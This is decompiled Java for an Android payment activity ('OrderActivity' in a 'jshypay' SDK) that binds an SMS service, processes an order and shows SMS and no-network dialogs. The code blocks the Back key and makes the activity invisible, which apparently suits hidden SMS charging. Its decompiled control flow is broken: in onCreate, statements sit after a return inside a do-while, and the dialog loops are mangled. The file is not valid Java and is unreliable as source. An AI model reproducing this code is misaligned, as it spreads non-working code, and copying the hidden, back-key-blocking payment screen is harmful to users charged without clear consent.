package com.jshymedia.jshypay.activity;

import android.app.ProgressDialog;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.support.v4.app.DialogFragment;
import android.support.v4.app.FragmentActivity;
import android.view.KeyEvent;
import android.widget.Toast;
import com.jshymedia.jshypay.dialog.MyDialog;
import com.jshymedia.jshypay.order.PayOrder;
import com.jshymedia.jshypay.order.WorkTask;
import com.jshymedia.jshypay.service.SysService;
import com.jshymedia.jshypay.ztool.Zlog;

public class OrderActivity
  extends FragmentActivity
{
  private boolean a = false;
  private Bundle b;
  private int c;
  private PayOrder d;
  private ProgressDialog e;
  private ServiceConnection f = new a(this);
  public SysService smsService;
  
  public OrderActivity()
  {
    new b(this);
  }
  
  public void changeUI()
  {
    if (!this.d.isTalk()) {
      this.e = ProgressDialog.show(this, null, "正在处理...");
    }
    if (this.d.isFinish()) {
      finish();
    }
  }
  
  public PayOrder getOrder()
  {
    return this.d;
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    bindService(new Intent(this, SysService.class), this.f, 1);
    setFinishOnTouchOutside(false);
    this.b = getIntent().getExtras();
    this.c = this.b.getInt("orderId");
    this.d = PayOrder.getOrderWithId(this.c);
    if (this.d == null)
    {
      Toast.makeText(this, "无法读取订单信息", 0).show();
      finish();
    }
    do
    {
      return;
      this.d.setActivity(this);
      Zlog.syso("activity-order:" + this.d.toString());
    } while (this.d.getState() == 11);
    new WorkTask(this.d).execute(new Void[0]);
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    if (this.a) {
      unbindService(this.f);
    }
    if ((this.e != null) && (this.e.isShowing())) {
      this.e.dismiss();
    }
    if (this.d != null) {
      this.d.setActivity(null);
    }
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if (paramInt == 4) {
      return true;
    }
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  protected void onPause()
  {
    super.onPause();
    this.d.setActivityState(2);
    if ((this.e != null) && (this.e.isShowing())) {
      this.e.dismiss();
    }
  }
  
  public void onPayError(int paramInt)
  {
    MyDialog localMyDialog;
    Bundle localBundle;
    switch (paramInt)
    {
    default: 
      return;
    case -1: 
      if (this.e != null) {}
      for (paramInt = 1;; paramInt = 0)
      {
        if ((paramInt & this.e.isShowing()) != 0) {
          this.e.dismiss();
        }
        localMyDialog = new MyDialog();
        localBundle = new Bundle();
        localBundle.putInt("type", 1);
        localMyDialog.setArguments(localBundle);
        localMyDialog.setCancelable(false);
        localMyDialog.show(getSupportFragmentManager(), "noNetDialog");
        this.d.setTalk(true);
        return;
      }
    }
    if (this.e != null) {}
    for (paramInt = 1;; paramInt = 0)
    {
      if ((paramInt & this.e.isShowing()) != 0) {
        this.e.dismiss();
      }
      localMyDialog = new MyDialog();
      localBundle = new Bundle();
      localBundle.putInt("type", 2);
      localMyDialog.setArguments(localBundle);
      localMyDialog.setCancelable(false);
      localMyDialog.show(getSupportFragmentManager(), "noNetDialog");
      this.d.setTalk(true);
      return;
    }
  }
  
  public void onPayTalk(int paramInt)
  {
    if (this.e != null) {}
    for (int i = 1;; i = 0)
    {
      if ((i & this.e.isShowing()) != 0) {
        this.e.dismiss();
      }
      MyDialog localMyDialog = new MyDialog();
      Bundle localBundle = new Bundle();
      localBundle.putInt("type", paramInt);
      localBundle.putInt("orderId", this.c);
      localMyDialog.setArguments(localBundle);
      localMyDialog.setCancelable(false);
      localMyDialog.show(getSupportFragmentManager(), "SMS");
      this.d.setTalk(true);
      return;
    }
  }
  
  protected void onResume()
  {
    super.onResume();
    setVisible(false);
    changeUI();
    this.d.setActivityState(1);
  }
}
